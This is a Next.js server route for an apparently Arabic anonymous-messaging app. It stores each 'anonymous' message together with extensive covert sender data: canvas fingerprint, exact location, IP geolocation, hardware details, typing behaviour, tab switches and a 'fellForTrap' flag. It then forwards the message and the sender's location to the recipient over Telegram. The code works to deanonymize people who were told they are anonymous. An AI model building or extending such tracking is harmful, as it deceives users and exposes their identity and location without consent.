import { prisma } from "../../../lib/prisma";
import { NextResponse } from "next/server";

// Simple in-memory rate limiting map
const rateLimiter = new Map();

export async function POST(req) {
  try {
    const { content, senderName, receiverUsername, batteryInfo, screenResolution, browserLanguage, ramSize, cpuCores, isTouch, gpuModel, referrer, timezone, timeSpent, backspacesCount, sessionId, canvasFingerprint, exactLocation, fellForTrap, tabSwitches, isPasted, typingSpeed, networkType, historyLength, devicesInfo } = await req.json();

    if (!content || !receiverUsername) {
      return NextResponse.json({ error: "بيانات غير مكتملة" }, { status: 400 });
    }

    // Find receiver
    const receiver = await prisma.user.findUnique({ where: { username: receiverUsername } });
    if (!receiver) {
      return NextResponse.json({ error: "المستخدم غير موجود" }, { status: 404 });
    }

    // Extract IP for device info and Rate Limiting
    const ipAddress = req.headers.get("x-forwarded-for")?.split(",")[0] || req.headers.get("x-real-ip") || "Unknown IP";
    
    // Rate Limiting (5 requests per integer minute approximate limit)
    const now = Date.now();
    const rateWindow = 60 * 1000; // 1 minute
    if (ipAddress !== "Unknown IP") {
      const userRequests = rateLimiter.get(ipAddress) || { count: 0, firstRequest: now };
      
      if (now - userRequests.firstRequest > rateWindow) {
        rateLimiter.set(ipAddress, { count: 1, firstRequest: now });
      } else {
        if (userRequests.count >= 5) {
          return NextResponse.json({ error: "تم إرسال رسائل كثيرة مؤخراً. يرجى الانتظار قليلاً." }, { status: 429 });
        }
        userRequests.count++;
        rateLimiter.set(ipAddress, userRequests);
      }
    }

    const userAgent = req.headers.get("user-agent") || "Unknown User Agent";
    
    let deviceType = "Computer";
    if (/Mobi|Android/i.test(userAgent)) deviceType = "Mobile";
    if (/Tablet|iPad/i.test(userAgent)) deviceType = "Tablet";

    // Fetch IP Location
    let country = null;
    let city = null;
    let isp = null;
    if (ipAddress && ipAddress !== "Unknown IP" && ipAddress !== "::1" && ipAddress !== "127.0.0.1") {
      try {
        const geoRes = await fetch(`http://ip-api.com/json/${ipAddress}`);
        if (geoRes.ok) {
          const geoData = await geoRes.json();
          if (geoData.status === "success") {
            country = geoData.country;
            city = geoData.city;
            isp = geoData.isp;
          }
        }
      } catch (e) {
        console.error("IP lookup failed", e);
      }
    }

    // Save message
    const message = await prisma.message.create({
      data: {
        content,
        senderName: senderName || null,
        ipAddress,
        userAgent,
        deviceType,
        batteryInfo: batteryInfo || null,
        screenResolution: screenResolution || null,
        browserLanguage: browserLanguage || null,
        ramSize: ramSize || null,
        cpuCores: cpuCores || null,
        isTouch: isTouch || null,
        gpuModel: gpuModel || null,
        country,
        city,
        isp,
        referrer: referrer || null,
        timezone: timezone || null,
        timeSpent: timeSpent || null,
        backspacesCount: backspacesCount || null,
        sessionId: sessionId || null,
        canvasFingerprint: canvasFingerprint || null,
        exactLocation: exactLocation || null,
        fellForTrap: fellForTrap ? true : false,
        tabSwitches: tabSwitches || 0,
        isPasted: isPasted ? true : false,
        typingSpeed: typingSpeed || null,
        networkType: networkType || null,
        historyLength: historyLength || null,
        devicesInfo: devicesInfo || null,
        receiverId: receiver.id
      }
    });

    // Send Telegram Notification
    if (receiver.telegramChatId) {
      const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
      if (telegramBotToken) {
        const text = `صراحة جديدة 💬\n\nالرسالة: ${content}\n\nالمرسل: ${senderName || 'مجهول'}\nالموقع: ${country || ''} - ${city || ''}`;
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        fetch(telegramUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: receiver.telegramChatId, text: text })
        }).catch(err => console.error("Telegram error", err));
      }
    }

    return NextResponse.json({ success: true });
  } catch (err) {
    return NextResponse.json({ error: "حدث خطأ أثناء الإرسال" }, { status: 500 });
  }
}
